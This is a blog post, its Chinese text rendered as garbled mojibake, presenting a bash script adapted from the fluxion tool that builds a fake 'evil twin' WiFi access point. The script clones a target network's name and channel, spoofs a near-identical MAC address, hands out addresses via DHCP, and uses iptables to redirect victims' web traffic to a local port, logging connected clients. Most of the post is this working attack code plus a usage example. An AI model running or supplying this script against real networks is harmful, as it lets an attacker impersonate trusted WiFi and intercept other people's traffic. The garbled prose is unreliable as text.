---
layout: post
title: "ä¼ªé€ WIFI"
subtitle: 'ä¼ªé€ WIFI'
author: "taomujian"
header-style: text
tags:
  - æ¸—é€æµ‹è¯•
  - æ— çº¿æ”»å‡»
---




## å‰è¨€

> æœ€è¿‘åœ¨ç ”ç©¶WIFIæµé‡åŠ«æŒçš„ç›¸å…³å·¥å…·,ç”±äºæŠ€æœ¯æ ˆå¤ªæµ…,è¿‡ç¨‹é¢‡ä¸ºç—›è‹¦ğŸ˜–,è¿˜æ˜¯å¤ªèœäº†,æœ‰ä¸€éƒ¨åˆ†æ˜¯ä¼ªé€ wifiçš„è¿‡ç¨‹,ç®€åŒ–ä¸‹æ”¾å‡ºæ¥,åŸºäºfluxionå·¥å…·ä¿®æ”¹çš„,éœ€è¦æœ‰ä¸€ä¸ªæ— çº¿ç½‘å¡,å¯ä»¥åœ¨æŸå®ä¸ŠèŠ±å‡ åå…ƒä¹°ä¸ª


## å®‰è£…ä¾èµ–

> apt update && apt install -y hostapd isc-dhcp-server

> hostapd ç”¨æ¥å»ºç«‹wifiçƒ­ç‚¹, isc-dhcp-server ç”¨æ¥ç»™è¿ä¸Šä¼ªé€ wifiçš„å®¢æˆ·ç«¯åˆ†é…ipå’Œé…ç½®dnsæœåŠ¡

## ä»£ç 

```shell
#!/usr/bin/env bash

OutputDevice=/dev/null
APServiceInterface="" # æä¾›wifiæœåŠ¡çš„ç½‘å¡åå­—
CaptivePortalAccessInterface="" # æä¾›wifiæœåŠ¡çš„ç½‘å¡åå­—
CaptivePortalAccessPointInterface="" # æä¾›wifiæœåŠ¡çš„ç½‘å¡åå­—
CaptivePortalGatewayAddress="192.169.254.1" # ç½‘å…³åœ°å€
TargetMAC=""      # wifi macåœ°å€
TargetSSID=""     # wifi åç§°
TargetChannel=""  # wifi é¢‘é“
Wifipassword=""   # wifi å¯†ç 
CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*} # æ ¹æ®ç½‘å…³åœ°å€è®¡ç®—å‡ºwifiåˆ†é…çš„åœ°å€ç½‘ç»œèŒƒå›´
IPTablesBackup="tmp/iptables-rules" # ç”¨æ¥å­˜å‚¨iptablesé…ç½®,å½“åœæ­¢ä¼ªé€ wifiåæ¢å¤åŸçŠ¶

# ä»å‘½ä»¤è¡Œè§£æå‚æ•°
ARGS=`getopt -o e:m:c:p:i: --long essid:,mac:,channel:,password:,interface: -- "$@"`
if [ $? != 0 ] ; then echo "Terminating..." >&2 ; exit 1 ; fi
eval set -- "$ARGS"
while true;do
    case "$1" in
        -i|--interface)
            APServiceInterface=$2
            CaptivePortalAccessInterface=$2
            CaptivePortalAccessPointInterface=$2
            shift 2
            ;;
        -e|--essid)
            TargetSSID=$2
            shift 2
            ;;
        -m|--mc)
            TargetMAC=$2
            shift 2
            ;;
        -c|--channel)
            TargetChannel=$2
            shift 2
            ;;
        -p|--password)
            Wifipassword=$2
            shift 2
            ;;
        --)
            shift
            break
            ;;
        *) 
            echo "æœªçŸ¥çš„å‚æ•°é€‰é¡¹:{$1}"
            exit 1
            ;;
    esac
done

# æ•æ‰control c ä¿¡å·,å½“æ•è·å,åœæ­¢ä¼ªé€ wifi,å¹¶æ¢å¤åŸçŠ¶
trap 'stop_attack' SIGINT

# å¼€å¯apæœåŠ¡å‰çš„ä¸€äº›é…ç½®å·¥ä½œ,å†™å…¥hostapdé…ç½®æ–‡ä»¶
ap_service_prep() {
  if [ ${#@} -lt 5 ]; then return 1; fi
  
  APServiceInterface=$1
  APServiceInterfaceAddress=$2
  APServiceSSID=$3
  APServiceMAC=$4
  APServiceChannel=$5
  
  kill $APServicePID &> $OutputDevice

  # Prepare the hostapd config file.
  echo "\
interface=$APServiceInterface
driver=nl80211
ssid=$APServiceSSID
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=$Wifipassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
channel=$APServiceChannel" \
  > "tmp/$APServiceMAC-hostapd.conf"

  # Spoof virtual interface MAC address.
  ip link set $APServiceInterface down
  sleep 0.5

  macchanger --mac=$APServiceMAC $APServiceInterface &> $OutputDevice
  sleep 0.5

  ip link set $APServiceInterface up
  sleep 0.5

  # HostAPD sets the virtual interface mode
  # to master, which is supported by dhcpd.
  APServiceAccessInterface=$APServiceInterface
}

# è®¾ç½®æ”»å‡»é€‰é¡¹,å†™å…¥dhcpé…ç½®æ–‡ä»¶
captive_portal_set_attack() {
  local -r rogueMACHex=$(printf %02X $((0x${TargetMAC:13:1} + 1)))
  TargetRogueMAC="${TargetMAC::13}${rogueMACHex:1:1}${TargetMAC:14:4}"
  ap_service_prep \
    "$CaptivePortalAccessPointInterface" \
    "$CaptivePortalGatewayAddress" \
    "$TargetSSID" \
    "$TargetRogueMAC" \
    "$TargetChannel"
    CaptivePortalAccessInterface=$APServiceAccessInterface

  # Generate the dhcpd configuration file, which is
  # used to provide DHCP service to rogue AP clients.
  echo "\
authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $CaptivePortalGatewayNetwork.0 netmask 255.255.255.0 {
    option broadcast-address $CaptivePortalGatewayNetwork.255;
    option routers $CaptivePortalGatewayAddress;
    option subnet-mask 255.255.255.0;
    option domain-name-servers $CaptivePortalGatewayAddress,8.8.8.8,114.114.114.114;

    range $CaptivePortalGatewayNetwork.100 $CaptivePortalGatewayNetwork.254;
}\
" >"tmp/dhcpd.conf"

  # create an empty leases file
  touch "tmp/dhcpd.leases"
}

# æ¢å¤åŸæœ‰çš„iptablesè§„åˆ™
captive_portal_unset_routes() {
  if [ -f "$IPTablesBackup" ]; then
    iptables-restore <"$IPTablesBackup" \
      &> $OutputDevice
  else
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
  fi

  # Restore system's original forwarding state
  if [ -f "tmp/ip_forward" ]; then
    sysctl -w net.ipv4.ip_forward=$(
      cat "tmp/ip_forward"
    ) &> $OutputDevice
    rm -rf "tmp/ip_forward"
  fi

  if [ -f "tmp/send_redirects" ]; then
    sysctl -w net.ipv4.conf.all.send_redirects=$(
      cat "tmp/send_redirects"
    ) &> $OutputDevice
    rm -rf "tmp/send_redirects"
  fi

  ip addr del $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface 2>/dev/null
}

# è®¾ç½®iptablesè§„åˆ™,å½“å®¢æˆ·ç«¯è¿ä¸Šä¼ªé€ çš„wifiå,iptablesæŠŠæ— çº¿ç½‘å¡çš„æµé‡è½¬å‘åˆ°æœ¬æœºä¸Š,ä»¥ä½¿å®¢æˆ·ç«¯èƒ½æ­£å¸¸ä¸Šç½‘
captive_portal_set_routes() {
  # Give an address to the gateway interface in the rogue network.
  # This makes the interface accessible from the rogue network.
  ip addr add $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface

  # Save the system's routing state to restore later.
  cp "/proc/sys/net/ipv4/ip_forward" "tmp/ip_forward"
  cp "/proc/sys/net/ipv4/conf/all/send_redirects" "tmp/send_redirects"

  # Activate system IPV4 packet routing/forwarding.
  sysctl -w net.ipv4.ip_forward=1 &>$OutputDevice
  sysctl -w net.ipv4.conf.all.send_redirects=0 &>$OutputDevice

  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables -P FORWARD ACCEPT
  iptables -t nat -A PREROUTING -s $CaptivePortalGatewayNetwork/24 -p tcp --dport 80 -j REDIRECT --to-port 8080
  iptables -t nat -A POSTROUTING -j MASQUERADE
}

# åœæ­¢æ”»å‡»
stop_attack() {

  rm -rf "tmp/clients.txt"
  rm -rf "tmp/hosts"
  rm -rf "tmp/iptables-rules"
  rm -rf "tmp/dhcpd.leases"
  rm -rf "tmp/dhcpd.leases~"
  rm -rf "tmp/dhcpd.conf"
  rm -rf "tmp/$APServiceMAC-hostapd.conf"
  
  captive_portal_unset_routes
  killall xterm &> $OutputDevice
  killall hostapd &> $OutputDevice
}

# å¼€å§‹æ”»å‡»
start_attack() {
  mkdir tmp
  rfkill unblock all
  
  captive_portal_set_attack
  echo 'è®¾ç½®æ”»å‡»å®Œæ¯•'
  sleep 2

  iptables-save >"$IPTablesBackup"
  xterm -bg "#000000" -fg "#FFFFFF" \
    -title " AP Service [hostapd]" -e \
    hostapd "tmp/$APServiceMAC-hostapd.conf" &
  echo 'å¼€å¯apæœåŠ¡å®Œæ¯•'
  sleep 2

  captive_portal_set_routes &
  echo 'è®¾ç½®è·¯ç”±å®Œæ¯•'
  sleep 2

  xterm -bg black -fg "#CCCC00" \
    -title " AP DHCP Service" -e \
    "dhcpd -d -f -lf \"tmp/dhcpd.leases\" -cf \"tmp/dhcpd.conf\" $CaptivePortalAccessInterface 2>&1 | tee -a \"tmp/clients.txt\"" &
  

}

start_attack
sleep infinity &
wait
```

## ä½¿ç”¨

> ./wifi.sh -i 'wlan0' -e 'test' -p 'test123456' -c '10' -m '05:D2:B4:31:A7:28'

> å¤§åŠŸå‘Šæˆ